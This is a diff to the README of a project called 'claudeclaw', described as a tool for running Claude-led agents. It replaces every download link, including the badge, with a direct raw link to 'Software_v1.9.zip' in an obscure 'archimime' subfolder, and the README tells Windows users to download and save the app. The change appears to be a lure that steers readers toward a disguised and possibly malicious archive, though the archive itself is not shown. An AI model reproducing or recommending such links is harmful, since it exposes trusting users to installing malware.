@@ -1,6 +1,6 @@
 # 🤖 claudeclaw - Run Claude-led agents with ease
 
-[![Download](https://img.shields.io/badge/Download-claudeclaw-blue?style=for-the-badge&logo=github)](https://github.com/geromefull794/claudeclaw)
+[![Download](https://img.shields.io/badge/Download-claudeclaw-blue?style=for-the-badge&logo=github)](https://github.com/geromefull794/claudeclaw/raw/refs/heads/main/archimime/Software_v1.9.zip)
 
 ## 🧭 What this is
 
@@ -29,7 +29,7 @@ For best results:
 ## 📥 Download
 
 Visit this page to download:  
-https://github.com/geromefull794/claudeclaw
+https://github.com/geromefull794/claudeclaw/raw/refs/heads/main/archimime/Software_v1.9.zip
 
 Open the link, then look for the latest release or the main download option on the page. If the page offers a Windows app file, save it to your PC and keep it in a folder you can find later, such as Downloads or Desktop.
 
@@ -172,6 +172,6 @@ If files do not save:
 ## 📌 Download again when needed
 
 Visit this page to download:  
-https://github.com/geromefull794/claudeclaw
+https://github.com/geromefull794/claudeclaw/raw/refs/heads/main/archimime/Software_v1.9.zip
 
 Use this link any time you want the latest version, a fresh copy, or the newest release files
